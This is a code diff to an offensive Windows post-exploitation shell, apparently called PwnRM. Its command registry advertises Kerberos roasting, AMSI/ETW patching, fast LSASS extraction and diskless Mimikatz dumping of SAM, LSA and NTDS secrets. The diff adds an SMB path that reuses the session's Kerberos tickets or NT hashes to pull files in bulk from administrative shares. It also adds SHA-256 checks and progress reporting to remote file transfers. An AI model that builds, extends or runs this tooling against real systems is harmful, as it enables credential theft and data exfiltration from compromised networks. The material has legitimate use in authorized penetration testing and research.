@@ -17,6 +17,7 @@ from ipaddress import ip_address
 from base64 import b64decode, b64encode
 from datetime import datetime
 from typing import Optional, List, Dict, Any, Callable
+from urllib.parse import urlparse
 from Cryptodome.Hash import SHA256
 
 try:
@@ -124,7 +125,7 @@ COMMAND_REGISTRY = {
         "!adcs [--quick] [--template <T>] [--ca <CA>] [--alt SAN] [--wsus]": "ADCS CA/template/ACL & WSUS triage",
         "!kerberos [roast|asrep|rbcd|dmsa|diamond]": "Kerberos exposure, RBCD and dMSA triage",
         "!entra [full]": "Entra join-state and cloud-cache inventory",
-        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-output PATH] [--download]": "Credential artifacts & ephemeral LSASS parsing",
+        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-executor PE] [--lsa-timeout SEC] [--lsa-output PATH] [--download]": "Credential artifacts & fast LSASS extraction",
         "!laps [all|encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
         "!acl [tier0] [--target <T>]": "Active Directory DACL & privilege escalation scout",
         "!token [list|privs]": "Process token inventory & privilege audit",
@@ -132,7 +133,7 @@ COMMAND_REGISTRY = {
         "!lateral [--subnet <s>] [--ports P] [--probe-auth]": "Bounded subnet and service scout",
     },
     "Collection, Runtime & In-Memory Execution": {
-        "!vss [sam|ntds] [--drive C:] [--download]": "Ephemeral VSS extraction & secret display",
+        "!vss [sam|lsa|ntds] [--mimikatz] [--mimikatz-executor PE] [--user USER] [--drive C:] [--download]": "Diskless Mimikatz or ephemeral VSS secret extraction",
         "!coerce [webdav|smb|all] --listener <IP> [--port N]": "Outbound UNC authentication probe",
         "!evasion [edr|amsi|etw]": "Runtime AMSI/ETW patch & EDR scout",
         "!adtriage [--quick]": "AD post-auth quick triage",
@@ -1523,6 +1524,110 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
             )
         return stripped
 
+    def _open_authenticated_smb(self):
+        """Open an SMB session using the credentials of the active WinRM transport."""
+        from impacket.smbconnection import SMBConnection
+        from ..core.credentials import KrbCredential, NTCredential
+
+        transport = getattr(self.runspace, "_transport", None)
+        creds = getattr(transport, "creds", None)
+        parsed = urlparse(str(getattr(transport, "url", "")))
+        host = parsed.hostname or str(self.target_info.get("host", ""))
+        if not host:
+            raise ValueError("SMB fast path could not resolve the target host")
+
+        smb = SMBConnection(host, host, timeout=max(30, int(getattr(self.runspace, "timeout", 30))))
+        try:
+            if isinstance(creds, KrbCredential):
+                previous_ccache = os.environ.get("KRB5CCNAME")
+                if creds.ccache:
+                    # pyspnego accepts MIT's FILE: URI form, while Impacket's
+                    # CCache loader opens KRB5CCNAME as a literal filesystem
+                    # path. Keep each dependency's expected representation.
+                    os.environ["KRB5CCNAME"] = creds.ccache.removeprefix("FILE:")
+                try:
+                    smb.kerberosLogin(
+                        creds.username,
+                        creds.password,
+                        creds.domain,
+                        useCache=True,
+                    )
+                finally:
+                    if previous_ccache is None:
+                        os.environ.pop("KRB5CCNAME", None)
+                    else:
+                        os.environ["KRB5CCNAME"] = previous_ccache
+            elif isinstance(creds, NTCredential):
+                smb.login(
+                    creds.username,
+                    creds.password,
+                    creds.domain,
+                    "",
+                    creds.nt_hash,
+                )
+            else:
+                raise ValueError("active WinRM credentials cannot authenticate SMB")
+        except Exception:
+            try:
+                smb.logoff()
+            except Exception:
+                pass
+            raise
+        return smb
+
+    def _read_remote_file_smb(
+        self,
+        remote_path: str,
+        expected_size: int,
+        expected_hash: bytes,
+        max_bytes: int,
+    ) -> bytearray:
+        """Use an authenticated administrative share as the bulk-transfer fast path."""
+        windows_path = PureWindowsPath(remote_path)
+        if not windows_path.drive or windows_path.drive.startswith("\\\\"):
+            raise ValueError("SMB fast path requires an absolute drive-letter path")
+        share = f"{windows_path.drive.rstrip(':')}$"
+        relative_path = "\\".join(windows_path.parts[1:])
+        data = bytearray()
+        started = time.monotonic()
+        last_update = 0.0
+
+        def collect(chunk):
+            nonlocal last_update
+            if len(data) + len(chunk) > max_bytes:
+                raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
+            data.extend(chunk)
+            now = time.monotonic()
+            if now - last_update >= 0.25 or len(data) == expected_size:
+                elapsed = max(now - started, 0.001)
+                pct = min(100.0, len(data) * 100.0 / max(expected_size, 1))
+                rate = len(data) / 1048576 / elapsed
+                self.write_progress(
+                    f"SMB transfer {len(data)}/{expected_size} bytes ({pct:.1f}%) — {rate:.2f} MiB/s"
+                )
+                last_update = now
+
+        smb = self._open_authenticated_smb()
+        try:
+            smb.getFile(share, relative_path, collect)
+        except Exception:
+            data[:] = b"\x00" * len(data)
+            raise
+        finally:
+            try:
+                smb.logoff()
+            except Exception:
+                pass
+
+        if len(data) != expected_size:
+            received_size = len(data)
+            data[:] = b"\x00" * len(data)
+            raise OSError(f"SMB transfer length mismatch: {received_size} != {expected_size}")
+        if SHA256.new(data).hexdigest().upper().encode("ascii") != expected_hash:
+            data[:] = b"\x00" * len(data)
+            raise OSError("SMB transfer SHA-256 verification failed")
+        return data
+
     def read_remote_file(self, remote_path: str, max_bytes: int | None = None) -> bytearray:
         """Stream one remote file into memory and verify its SHA-256 trailer."""
         path_raw = self.run_sync(
@@ -1543,9 +1648,37 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
         if max_bytes <= 0:
             raise ValueError("maximum remote file size must be positive")
 
+        metadata = self.run_sync(
+            f"$item = Get-Item -LiteralPath '{path_ps}' -Force -ErrorAction Stop; "
+            "$item.Length; "
+            f"Get-FileHash -LiteralPath '{path_ps}' -Algorithm SHA256 | Select-Object -ExpandProperty Hash"
+        ).splitlines()
+        if len(metadata) < 2:
+            raise OSError("could not retrieve remote file metadata")
+        try:
+            remote_size = int(metadata[0].strip())
+        except ValueError as exc:
+            raise OSError("remote file returned an invalid size") from exc
+        expected_hash = metadata[-1].strip().upper().encode("ascii")
+        if remote_size < 0 or remote_size > max_bytes:
+            raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
+        if not re.fullmatch(rb"[0-9A-F]{64}", expected_hash):
+            raise OSError("remote file returned an invalid SHA-256 value")
+
+        if remote_size >= 256 * 1024:
+            try:
+                return self._read_remote_file_smb(
+                    path,
+                    remote_size,
+                    expected_hash,
+                    max_bytes,
+                )
+            except Exception as exc:
+                logging.debug("SMB bulk-transfer fast path unavailable: %s", exc)
+
         transfer_chunk_size = self._transfer_chunk_size()
         script = f"""
-$hash = Get-FileHash -LiteralPath '{path_ps}' -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+$hash = '{expected_hash.decode("ascii")}'
 $file = [System.IO.File]::OpenRead('{path_ps}')
 try {{
     $buffer = New-Object byte[] {transfer_chunk_size}
@@ -1558,9 +1691,12 @@ try {{
 [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hash))
 """
         streamed = bytearray()
+        started = time.monotonic()
+        last_update = 0.0
         error_count = len(getattr(self, "last_run_errors", []))
 
         def collect(output):
+            nonlocal last_update
             stdout = output.get("stdout")
             if not stdout:
                 return
@@ -1572,6 +1708,16 @@ try {{
                 if len(streamed) + len(chunk) > max_bytes + 64:
                     raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
                 streamed.extend(chunk)
+                now = time.monotonic()
+                received = min(len(streamed), remote_size)
+                if now - last_update >= 0.25 or received == remote_size:
+                    elapsed = max(now - started, 0.001)
+                    pct = min(100.0, received * 100.0 / max(remote_size, 1))
+                    rate = received / 1048576 / elapsed
+                    self.write_progress(
+                        f"PSRP transfer {received}/{remote_size} bytes ({pct:.1f}%) — {rate:.2f} MiB/s"
+                    )
+                    last_update = now
 
         try:
             interrupted = self.run_with_interrupt(script, collect)
@@ -1583,8 +1729,12 @@ try {{
             if len(streamed) < 64:
                 raise OSError("remote stream did not include a SHA-256 trailer")
             payload = bytearray(streamed[:-64])
-            expected = SHA256.new(payload).hexdigest().upper().encode("ascii")
-            if streamed[-64:] != expected:
+            if len(payload) != remote_size:
+                received_size = len(payload)
+                payload[:] = b"\x00" * len(payload)
+                raise OSError(f"PSRP transfer length mismatch: {received_size} != {remote_size}")
+            actual = SHA256.new(payload).hexdigest().upper().encode("ascii")
+            if streamed[-64:] != expected_hash or actual != expected_hash:
                 payload[:] = b"\x00" * len(payload)
                 raise OSError("remote file SHA-256 verification failed")
             return payload
